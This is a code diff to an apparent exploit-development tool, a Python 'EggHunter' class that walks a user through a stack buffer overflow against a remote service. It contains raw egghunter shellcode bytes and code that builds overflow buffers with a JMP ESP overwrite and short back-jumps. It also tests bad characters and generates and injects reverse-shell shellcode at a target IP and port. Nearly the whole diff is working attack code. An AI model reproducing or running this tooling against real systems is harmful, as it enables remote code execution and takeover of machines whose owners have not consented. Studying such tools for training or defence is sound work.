@@ -40,35 +40,49 @@ class EggHunter:
     #################################
     # EggHunter Exploit Method
 
+    def str_encode(self, string):
+        if (sys.version_info >= (3, 0)):
+            enc_string = str(string).encode('latin-1')
+        else:
+            enc_string = (string)
+
+        return enc_string
+
     def stack_fill(self, sendHunter):
 
         # print("[+] Filling stack at " + str(offset))
 
-        _hunter_begin = "\x90" * 4
-        self.hunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
-        self.hunter += "\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
-        _hunter_end = "\x90" * 4  # 4 bytes is lost when hunter iniates
+        _hunter_begin = self.str_encode("\x90" * 4)
+        self.hunter = self.str_encode("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74")
+        self.hunter += self.str_encode("\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
+        _hunter_end = self.str_encode("\x90" * 4)  # 4 bytes is lost when hunter iniates
 
         if(sendHunter != False):
             _hunter = _hunter_begin + self.hunter + _hunter_end
-            _offset = "A" * (self.config.offset - len(_hunter)) + _hunter
+            _offset = self.str_encode("A" * (self.config.offset - len(_hunter))) + _hunter
         else:
-            _offset = "A" * self.config.offset
+            _offset = self.str_encode("A" * self.config.offset)
 
         if self.config.jmpesp_add != "":
             _eip = pack('<L', int("0x" + self.config.jmpesp_add, 16))
         else:
-            _eip = "B" * 4
+            _eip = self.str_encode("B" * 4)
 
         if self.config.instruction != "":
             _esp = self.config.instruction
         else:
-            _esp = "C" * 4
+            _esp = self.str_encode("C" * 4)
 
-        buffer = _offset + _eip + _esp
-        # buffer += "\r\n"
+        buffer = _offset + _eip + _esp + self.str_encode(self.config.egg)
 
-        self.config.shellcode = self.config.egg + self.config.payload
+        buffer += self.str_encode("\r\n")
+
+        if(self.config.payload != ""):
+            _shellcode = self.config.payload
+        else:
+            _shellcode = self.str_encode("D" * 400)
+
+        self.config.shellcode = _shellcode
 
         return buffer
 
@@ -80,47 +94,16 @@ class EggHunter:
 
             inject_func = getattr(adapter, 'inject')
 
-            if(self.config.offset < 1 or self.config.offset == ""):
+            if(self.config.offset < 2 or self.config.offset == ""):
                 System.generic_fuzzer(self.config)
-
-            # self.offset = System.input("[?] Press ENTER if you wanna fuzz the application or input the offset to skip this:")
-            # if (self.offset != ""):
-            #     self.offset = int(self.offset)
-            # else:
-            #     self.offset = 0
-            #
-            # if (self.overflow == 0 and self.offset == 0):
-            #     self.overflow = fuzzer_func(self.config.remoteip, self.config.remoteport, self.config.field, 100, 100)
-            #
-            #     print("!" * 100)
-            #     print("[*] Application crashed at %s bytes" % self.overflow)
-            #
-            # if (self.offset == 0 and self.overflow > 0):
-            #     print("[*] Generating pattern: msf-pattern_create -l %s" % self.overflow)
-            #
-            #     # print subprocess.check_output(['msf-pattern_create', '-l', str(crash)])
-            #     # python3
-            #     # result = subprocess.run(['msf_pattern-create', crash], stdout=subprocess.PIPE)
-            #     # result.stdout
-            #
-            #     buffer = subprocess.check_output(['msf-pattern_create', '-l', str(self.overflow)]).strip()
-            #
-            #     gonext = System.input("[?] Press ENTER when you wanna give the shot!!! This will send the PATTERN imediately!!!")
-            #
-            #     # print(buffer);
-            #
-            #     inject_func(self.config.remoteip, self.config.remoteport, self.config.field, buffer, True)
-            #     print("[*] Buffer Injected " + str(len(buffer)) + " bytes to get OFFSET!!!")
-            #     eip_address = System.input("[?] Check the target debugger and enter EIP Value :")
-            #
-            #     _offset = subprocess.check_output(['msf-pattern_offset', '-q', str(self.eip_address)])
-            #     _offset = _offset.split('offset ')
-            #
-            #     self.offset = int(_offset[len(_offset) - 1].strip())
+            else:
+                print("[!] Got from session OFFSET " + str(self.config.offset))
 
             buffer = self.stack_fill(False)
-            print("[+] Buffer is aligned in EIP:")
-            print(buffer);
+
+            if (self.config.verbose_lv >= 1):
+                print("[+] Buffer is aligned in SEH record:")
+                print(buffer)
 
             #########################################################
             # GET JMP ADDRESS
@@ -137,11 +120,14 @@ class EggHunter:
                     print("[*] Buffer Injected (" + str(len(buffer)) + " bytes) to get JMP ESP!!!")
 
                     print("[!] Hint: !mona jmp -r esp -n")
-                    self.config.jmpesp_add = System.input("[?] Check the target debugger and enter JMP ESP Address :")
+                    self.config.jmpesp_add = System.input("[?] Check the target debugger and enter JMP ESP Address (eg. 011EFB28) :")
+
+                else:
+                    self.config.jmpesp_add = _jmpesp_add
 
                 if (self.config.mode == "http"):
                     buffer = adapter.make_request(self.config.remoteip, self.config.remoteport, self.config.field, self.stack_fill(False),
-                                                  self.shellcode, self.offset)
+                                                  self.config.shellcode, self.offset)
                 else:
                     buffer = self.stack_fill(False)
 
@@ -181,8 +167,8 @@ class EggHunter:
             # OP CODES FOR JUMPING BACK
 
             if (self.config.dest_address == "" and self.config.src_address == ""):
-                _src_address = System.input("[?] Enter the CCCC address :")
-                _dest_address = System.input("[?] Enter the destination address :")
+                _src_address = System.input("[?] Enter the CCCC memory address (eg. 011EFB28) :")
+                _dest_address = System.input("[?] Enter the destination memory address (eg. 011EFAF4) :")
 
                 try:
                     self.config.src_address = int("0x" + _src_address, 16)
@@ -195,8 +181,12 @@ class EggHunter:
             _instruction = System.input("[?] Enter the negative jmp short OPCODE for " + str(diff) + " (Hint: msf-nasm_shell> jmp short -" + str(diff) + ") : ")
             self.config.instruction = binascii.unhexlify(_instruction)
 
+            if (self.config.verbose_lv == 2):
+                print('Got ', self.config.instruction)
+                # print(_instruction)
+
             _instruction = HexUtil.hex_string_format(_instruction)
-            gonext = System.input("[?] Do you wanna test the OPCODE " + _instruction + " ? [Y/n]")
+            gonext = System.input("[?] Do you wanna test the OPCODE " + self.config.instruction + " ? [Y/n]")
 
             if (gonext.upper() == "Y"):
                 gonext = System.input(
@@ -213,7 +203,7 @@ class EggHunter:
             #########################################################
             # BADCHARS
 
-            gonext = System.input("[?] Do you want to test or add custom badchars? [T]est/[A]dd/[S]kip]")
+            gonext = System.input("[?] Do you want to test or add custom badchars? [T]est/[A]dd/[S]kip:")
 
             if(gonext.upper() == "T"):
                 self.config.shellcode = System.bytearray
@@ -223,7 +213,7 @@ class EggHunter:
                 inject_func(self.config.remoteip, self.config.remoteport, self.config.field, exploit, True)
 
             if(gonext.upper() != "S"):
-                bads = System.input("[+] Badchars detected : " + ",".join(System.badchars) + " Additional Badchars? Separate multiple HEX (without 0x) by commas: ")
+                bads = System.input("[+] Default Badchars is " + ",".join(System.badchars) + ". Additional Badchars? Separate multiple HEX (without 0x) by commas :")
 
                 if ',' in bads:
                     _bads = bads.split(',')
@@ -232,14 +222,14 @@ class EggHunter:
                 elif bads != "":
                     System.badchars.append(r'\x' + bads)
 
-                self.config.badchars = System.badchars
+            self.config.badchars = System.badchars
 
             #########################################################
             # SHELLCODE
 
             print("[!] Preparing Shellcode for reverse shell.....")
 
-            self.config.payload = System.shellcode(self.config.localip, self.config.localport, System.badchars, self.config.platform)
+            self.config.payload = System.shellcode(self.config)
 
             exploit = self.stack_fill(True)
 
